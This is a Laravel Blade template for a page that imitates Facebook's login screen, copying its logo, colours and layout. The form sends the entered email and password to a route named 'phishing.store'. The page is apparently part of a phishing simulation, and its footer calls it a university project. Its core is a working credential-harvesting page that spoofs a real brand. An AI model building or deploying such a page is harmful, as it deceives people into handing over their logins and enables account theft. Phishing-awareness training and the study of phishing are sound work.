<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background-color: #f0f2f5;
            font-family: Helvetica, Arial, sans-serif;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .facebook-header {
            padding: 16px 0;
            background-color: #ffffff;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }
        
        .facebook-logo {
            color: #1877f2;
            font-size: 40px;
            font-weight: bold;
            margin-left: 20px;
        }
        
        .login-container {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            padding: 20px;
            gap: 100px;
        }
        
        .promo-section {
            max-width: 500px;
            padding-right: 32px;
        }
        
        .promo-section h2 {
            font-size: 28px;
            font-weight: normal;
            line-height: 32px;
            margin-bottom: 20px;
            color: #1c1e21;
        }
        
        .features {
            list-style: none;
            margin-top: 30px;
            padding: 0;
        }
        
        .features li {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            font-size: 16px;
            color: #1c1e21;
        }
        
        .features i {
            color: #1877f2;
            font-size: 20px;
            margin-right: 10px;
        }
        
        .login-card {
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 396px;
        }
        
        .login-title {
            text-align: center;
            font-size: 18px;
            color: #1c1e21;
            margin-bottom: 20px;
            font-weight: normal;
        }
        
        .form-control {
            padding: 14px 16px;
            font-size: 17px;
            border-radius: 6px;
            border: 1px solid #dddfe2;
            color: #1d2129;
        }
        
        .form-control:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
            outline: none;
        }
        
        .btn-facebook {
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            padding: 12px;
            font-weight: bold;
        }
        
        .btn-facebook:hover {
            background-color: #166fe5;
        }
        
        .forgot-pw {
            color: #1877f2;
            text-align: center;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin: 10px 0;
        }
        
        .forgot-pw:hover {
            text-decoration: underline;
        }
        
        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px -20px;
        }
        
        .btn-create {
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            padding: 12px 16px;
            font-weight: bold;
            width: 60%;
            margin: 0 auto;
            display: block;
        }
        
        .btn-create:hover {
            background-color: #36a420;
        }
        
        .footer {
            background-color: #ffffff;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            color: #737373;
            margin-top: auto;
        }
        
        @media (max-width: 900px) {
            .login-container {
                flex-direction: column;
                text-align: center;
                gap: 40px;
            }
            
            .promo-section {
                padding-right: 0;
                margin-bottom: 40px;
            }
            
            .features {
                text-align: left;
            }
        }
        
        .alert-success {
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="facebook-header">
        <div class="facebook-logo">facebook</div>
    </div>
    
    <div class="login-container">
        <div class="promo-section">
            <h2>Facebook helps you connect and share with the people in your life.</h2>
            
            <ul class="features">
                <li><i class="fas fa-users"></i> Connect with friends and family</li>
                <li><i class="fas fa-share-alt"></i> Share photos and videos</li>
                <li><i class="fas fa-compass"></i> Discover new communities</li>
                <li><i class="fas fa-comments"></i> Chat with friends in real-time</li>
            </ul>
        </div>
        
        <div class="login-card">
            <h4 class="login-title">{{ ucfirst($category) }} Login</h4>

            @if(session('success'))
                <div class="alert alert-success">{{ session('success') }}</div>
            @endif

            <form action="{{ route('phishing.store') }}" method="POST">
                @csrf
                <input type="hidden" name="category" value="{{ $category }}">

                <div class="mb-3">
                    <input type="email" class="form-control" id="email" name="email" placeholder="Email address" required>
                </div>

                <div class="mb-3">
                    <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
                </div>

                <button type="submit" class="btn btn-facebook w-100">Log In</button>
                
                <a href="#" class="forgot-pw">Forgotten password?</a>
                
                <div class="divider"></div>
                
                <button type="button" class="btn-create">Create New Account</button>
            </form>
        </div>
    </div>
    
    <div class="footer">
        <p>Meta &copy; 2023. This is a university project page for educational purposes only.</p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>